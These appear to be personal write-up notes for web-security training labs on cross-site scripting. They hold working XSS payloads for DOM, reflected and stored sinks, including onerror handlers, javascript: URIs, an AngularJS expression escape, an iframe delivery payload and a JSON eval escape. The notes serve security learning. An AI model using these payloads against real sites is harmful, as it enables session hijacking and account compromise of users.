### DOM XSS in `document.write` sink using source `location.search`
```js
// see that my search string ends up in <img> tag:

<img src="/resources/images/tracker.gif?searchTerms=adsf" q7yoldkbi="">

// adjust search string to inject xss via <img> tag

sadf"><script>alert(1)</script>
```

### DOM XSS in `innerHTML` sink using source `location.search`
```js
// view-source / inspect element
// see that my search string ends up in <span> tag:

<span id="searchMessage">fake</span>

// break out
// key: force an error to trigger "onerror"

<img src=1 onerror=alert(1)>
<audio src/onerror=alert(2)>

// other key notes: it's totally ok to inject javascript as-is into <span> tags
```

### DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
```js
// see that '/feedback?returnPath=/' returns HTTP response with "src" calling "jquery":

<script src="/resources/js/jquery_1-8-2.js"></script>
<div class="is-linkback">
	<a id="backLink">Back</a>
</div>
<script>
	$(function() {
		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
	});
</script>

// see that a <href> tag is being built, using the input passed to "returnPath"
// try inject random chars to "returnPath":

/feedback?returnPath=asdf

// see that the resulting "Back" link leads to:

https://0af3007a032c23bcc10958b000a10065.web-security-academy.net/asdf

// now inject 

/feedback?returnPath=javascript:alert(document.cookie) 

// now the "Back" link simply reads:

javascript:alert(document.cookie)

// note: this uses the `javascript:` protocol to run text as JavaScript instead of opening it as a normal link
// sauce: https://riptutorial.com/html/example/2120/link-that-runs-javascript
```

### DOM XSS in jQuery selector sink `$()` using a hashchange event
```js
// vulnerable portion:

<script src="/resources/js/jquery_1-8-2.js"></script>
<script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
<script>
	$(window).on('hashchange', function(){
		var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
		if (post) post.get(0).scrollIntoView();
	});
</script>

// exploit via iframe (deliver to victim):

<iframe src="https://0a8200b703a078abc312925a0003009d.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

// test that "print()" does get called when this payload runs normally
// now deliver the payload
```

### Reflected XSS into attribute with angle brackets HTML-encoded [helpful but not direct sauce](https://www.secjuice.com/xss-arithmetic-operators-chaining-bypass-sanitization/)
```js
// normal "<h1>hola</h1>" injection becomes:

&lt;h1&gt;hola&lt;/h1&gt;

// try avoiding angular brackets altogether; study the environment closely
// notice that "hola" lands in a HTML attribute for an <input> tag:

<input type=text placeholder='Search the blog...' name=search value="hola">

// target that attribute; close it gracefully and inject an event

/?search="onmouseover="alert('hola')

// such that the <input> tag becomes:

<input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert('hola')">
```

### Stored XSS into anchor `href` attribute with double quotes HTML-encoded
```js
// see the sink:

<a id="author" href="https://www.fake.com">fake</a>

// adjust "website" payload:

javascript:alert(1)

// now the href sink becomes:

<a id="author" href="javascript:alert('hola')">

// end of the day, it's due to lack of input validation on "website" field
```

### Reflected XSS into a JavaScript string with angle brackets HTML encoded
```js
// sink:

<script>
var searchTerms = 'asdf';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

// break out of "encodeURIComponent()":

a'-alert('hola')-'

// sink becomes:

<script>
var searchTerms = 'a'-alert('hola')-'';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

// turns out it's nothing to do with the "encodeURIComponent()" - we're targeting the "var searchTerms" instead
```

### DOM XSS in `document.write` sink using source `location.search` inside a select element
```js
// vulnerable portion:

<form id="stockCheckForm" action="/product/stock" method="POST">
	<input required type="hidden" name="productId" value="2">
	<script>
		var stores = ["London","Paris","Milan"];
		var store = (new URLSearchParams(window.location.search)).get('storeId'); //supply "storeId" in params
		document.write('<select name="storeId">');
		if(store) { //right here
			document.write('<option selected>'+store+'</option>');
		}
		for(var i=0;i<stores.length;i++) {
			if(stores[i] === store) {
				continue;
			}
			document.write('<option>'+stores[i]+'</option>');
		}
		document.write('</select>');
	</script>
	<button type="submit" class="button">Check stock</button>
</form>
<span id="stockCheckResult"></span>
<script src="/resources/js/stockCheckPayload.js"></script>
<script src="/resources/js/stockCheck.js"></script>

// payload

/product?productId=2&storeId=alert(1)

// now the list has "alert(1)", but nothing executes

/product?productId=2&storeId=javascript:alert(1)

// now the list has "javascript:alert(1)", but again nothing executes

/product?productId=2&storeId=<script>alert(1)</script>

// now it executes
```

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded [sauce](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md#storedreflected-xss---simple-alert-in-angularjs)
```js
// nothing fancy - just see that there's a AngularJS being used:

/resources/js/angular_1-7-7.js

/*
 AngularJS v1.7.7
 (c) 2010-2018 Google, Inc. http://angularjs.org
 License: MIT
*/

// then just use this payload:

{{constructor.constructor('alert(1)')()}}

// how it looks like:

/?search=asdf{{constructor.constructor('alert(1)')()}}
```

### Reflected DOM XSS
```js
// typical "search" response looks like:

{"results":[],"searchTerm":"asdf"}

// vulnerable part, inside /resources/js/searchResults.js

function displaySearchResults(searchResultsObj) {
	var blogHeader = document.getElementsByClassName("blog-header")[0];
	var blogList = document.getElementsByClassName("blog-list")[0];
	var searchTerm = searchResultsObj.searchTerm //"asdf"
	var searchResults = searchResultsObj.results // []

// how to confirm:
// 1. use Debugger in firefox
// 2. choose js/searchResults.js
// 3. search breakpoint at "var searchTerm"
// 4. under "Watch expressions", type "searchTerm", click enter
// 5. refresh, see "searchTerm:"asdf"

// moving on.. see where "searchTerm" lands
var h1 = document.createElement("h1");
h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
blogHeader.appendChild(h1);
var hr = document.createElement("hr");
blogHeader.appendChild(hr)

// turns out the real vulnerable portion is in the "eval" right at the start:

xhr.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
		eval('var searchResultsObj = ' + this.responseText);
		displaySearchResults(searchResultsObj);
	}
};

// if input is "asdf", this.responseText becomes:

this.responseText: '{"results":[],"searchTerm":"asdf"}'

// we can try closing the " and adding an "-alert(1)" into the responseText
// payload:

/?search="-alert(1)-"}// //added "}// to close the curly brackets and comment out the rest of the JSON object

// result:

this.responseText: '{"results":[],"searchTerm":"\\"-alert(1)-\\"}//"}'

// looks like double-quotes (") are being escaped using "\\"
// try adding one "\" in our payload - so that when "\\" is added to the ("), the extra "\" turns it into \\\" , meaning the first two \\ escapes the third \ , and the " is no longer escaped
// meaning our payload becomes:

\"-alert(1)-"}//

// this effectively turns the searchTerm into:

"searchTerm":"\"-alert(1)-\\"}//

// try it out:

/?search=\"-alert(1)-"}//

// response:

this.responseText: '{"results":[],"searchTerm":"\\\\"-alert(1)-\\"}//"}'

// we get an error: Uncaught SyntaxError: invalid escape sequence
// the good thing here is our "\" isn't being properly escaped - we can confirm it:

/?search=\
<<- this.responseText: '{"results":[],"searchTerm":"\\"}'

// this triggers an error: Uncaught SyntaxError: "" literal not terminated before end of script

// back to our problem: in the first (") we already closed the double-quotation loop, so we don't actually need to add another (") behind.
// we can simply close the JSON object with "}" without having to add a second (")

\"-alert(1)-}//

// we get another error: Uncaught SyntaxError: expected expression, got '}'

\"-alert(1)}//

// this finally worked - but still need deeper understanding why the second "-" wrecked it at first - it doesn't simply act as a separator?
```

### Stored DOM XSS
```js
// what gets displayed:

{
	"avatar":"",
	"website":"http://asdf.asdf",
	"date":"2023-03-12T02:51:04.959314986Z",
	"body":"asdf",
	"author":"asdf"
}

// vulnerable part: /resources/js/loadCommentsWithVulnerableEscapeHtml.js

// check their escapeHTML
function escapeHTML(html) {
	return html.replace('<', '&lt;').replace('>', '&gt;');
}

// avatar
let avatarImgElement = document.createElement("img");
avatarImgElement.setAttribute("class", "avatar");
avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");

// body
if (comment.body) {
	let commentBodyPElement = document.createElement('p');
	commentBodyPElement.innerHTML = escapeHTML(comment.body);
	commentSection.appendChild(commentBodyPElement);
}

// author + website
if (comment.author) {
	if (comment.website) {
	  let websiteElement = document.createElement('a');
	  websiteElement.setAttribute('id', 'author');
	  websiteElement.setAttribute('href', comment.website);
	  firstPElement.appendChild(websiteElement)
}
	let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
	firstPElement.innerHTML = newInnerHtml
}

// see that only comment.author is escaped, but not comment.website
let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
firstPElement.innerHTML = newInnerHtml

// when it loads: (using Debugger)

newInnerHtml: '<a id="author" href="http://asdf.asdf"></a>asdf'

// try:

http://hola.com/url?="><script>alert(1)</script>

// stopped: (") is HTML-encoded

newInnerHtml: '<a id="author" href="http://hola.com/url?=&quot;><script>alert(1)</script>"></a>asdf'

// try:

http://hola.com/url?=javascript:alert(1)

// res:

newInnerHtml: '<a id="author" href="http://hola.com/url?=javascript:alert(1)"></a>asdf'

// nope

// turns out it's not the "website" field, it's the "comment body" that should be targeted because of the weak "replace()" function

// body:

<><>body

// res:

commentBodyPElement.innerHTML: "&lt;&gt;&lt;&gt;body"

// body:

<><h1>body</h1>

// res:

commentBodyPElement.innerHTML: "&lt;&gt;<h1>body</h1>" // vuln: see that only the first "<>" got encoded when treated as a string

// body:

<><script>alert(1)</script>

// res:

commentBodyPElement.innerHTML: "&lt;&gt;<script>alert(1)</script>" // doesn't execute - try force an error

// body:

<><audio src/onerror=alert(1)>

// res:

commentBodyPElement.innerHTML: '&lt;&gt;<audio src="" onerror="alert(1)"></audio>' // executed

// so the key lesson here is how JavaScript's "replace()" function works
// when the first argument is a string, the function only replaces the first occurrence
// by simply including an extra set of angle brackets at the beginning, 
// this extra set of angle brackets will be encoded, 
// but any subsequent angle brackets will be unaffected
```
